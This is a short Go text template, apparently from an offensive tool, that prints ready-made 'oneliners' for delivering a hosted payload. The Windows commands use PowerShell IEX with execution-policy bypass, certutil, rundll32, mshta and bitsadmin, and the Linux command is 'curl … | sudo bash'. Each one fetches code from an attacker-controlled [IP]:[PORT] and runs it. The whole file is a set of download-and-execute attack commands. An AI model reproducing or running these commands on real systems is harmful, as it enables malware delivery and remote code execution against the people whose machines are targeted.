{{ define "oneliners" }}
----- Windows -----

{{ "Powershell:" | faint }} powershell -exec bypass -c IEX (iwr '[PROTO]://[IP]:[PORT]/{{ .Path }}')
{{ "Powershell:" | faint }} powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('[PROTO]://[IP]:[PORT]/{{ .Path }}')|iex"
{{ "certutil:" | faint }} certutil -urlcache -split -f [PROTO]://[IP]:[PORT]/{{ .Path }} payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
{{ "rundll32:" | faint }} rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:mshta [PROTO]://[IP]:[PORT]/{{ .Path }});window.close();
{{ "mshta:" | faint }} mshta vbscript:Close(Execute("GetObject(""script:[PROTO]://[IP]:[PORT]/{{ .Path }}"")"))
{{ "mshta:" | faint }} mshta [PROTO]://[IP]:[PORT]/{{ .Path }}
{{ "bitsadmin:" | faint }} bitsadmin /transfer mydownloadjob /download /priority normal [PROTO]://[IP]:[PORT]/{{ .Path }} C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe

----- Linux -----
{{ "Bash:" | faint }} : curl -L [PROTO]://[IP]:[PORT]/{{ .Path }} | sudo bash
{{ end }}

--------- Oneliners ----------
{{ "Name:" | faint }}	{{ .Name }}
{{ "Path:" | faint }}	{{ .Path }}
{{ "Oneliners:" | faint }}
{{ template "oneliners" . }}

